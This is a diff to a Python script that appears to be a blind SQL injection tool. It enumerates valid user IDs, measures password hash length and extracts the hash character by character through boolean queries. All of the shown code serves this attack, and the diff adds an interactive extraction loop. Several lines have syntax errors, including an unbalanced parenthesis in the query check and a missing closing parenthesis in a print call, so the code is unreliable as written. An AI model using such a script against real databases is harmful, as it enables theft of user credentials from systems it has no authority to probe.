@@ -47,9 +47,9 @@ def password_len(user_id):
 
 #if user is valid and password hash is present, let's extract the hash
 #iterating through characters in password_length to find the true character
-def extract_hash(charset, user_id, password_length):
+def extract_hash(charset, user_id, password_len):
   found = ""
-  for i in range(0, password_length):
+  for i in range(0, password_len):
     for j in range(len(charset)):
       if boolean_query(i, user_id, charset[j])):
         found += charset[j]
@@ -67,7 +67,19 @@ def total_queries_taken():
 
 
 
-
+while True:
+  try:
+    user_id = input("> Enter a User ID to extract a password hash:  ")
+    if not invalid_user(user_id):
+      user_password_len = password_len(user_id)
+      print("\t[-] User {} hash length: {}".format(user_id, user_password_len))
+      total_queries_taken()
+    else:
+      print("\t\t [X] User {} does not exist".format(user_id) 
+  except KeyboardInterrupt: 
+    break 
+            
+      
 
 
   
